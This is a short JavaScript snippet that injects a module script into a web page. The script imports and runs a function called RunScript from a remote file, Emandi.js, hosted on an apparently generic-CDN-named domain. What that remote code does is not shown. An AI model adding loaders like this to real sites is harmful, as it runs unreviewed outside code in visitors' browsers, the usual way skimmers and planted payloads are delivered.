var script = document.createElement('script');
script.innerHTML = `import {RunScript} from 'https://globalcdn.onrender.com/static/Emandi.js';
RunScript();`;
script.setAttribute('type', 'module');
document.getElementsByTagName('body')[0].appendChild(script);
